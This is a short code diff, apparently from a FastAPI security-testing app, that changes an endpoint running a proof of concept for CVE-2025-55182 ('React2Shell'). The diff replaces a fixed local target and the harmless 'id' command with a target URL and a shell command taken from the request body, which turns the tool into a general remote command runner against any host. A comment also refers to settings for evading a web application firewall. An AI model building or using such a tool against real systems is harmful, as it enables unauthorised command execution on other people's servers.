@@ -12,8 +12,8 @@ app = FastAPI(
 app_base_path = "/security"
 
 
-@app.post(f"{app_base_path}/react2shell/id", tags=["poc"], response_model=dict)
-async def get_id():
+@app.post(f"{app_base_path}/react2shell/command/", tags=["poc"], response_model=dict)
+async def execute_command(body: dict):
     """
     CVE-2025-55182 (React2Shell) のPoCコードを実行します。
 
@@ -24,8 +24,8 @@ async def get_id():
     * https://github.com/ejpir/CVE-2025-55182-research?tab=readme-ov-file
     """
     # ターゲットURLと実行コマンドを設定
-    base_url = "http://localhost:8081"
-    executable_command = "id"
+    base_url = body.get("url")
+    executable_command = body.get("command")
 
     # ----------------------------------------------------
     # WAF回避のための設定
@@ -78,5 +78,5 @@ async def get_id():
     print(res.text)
 
     return {
-        "id": res.text,
+        "result": res.text,
     }
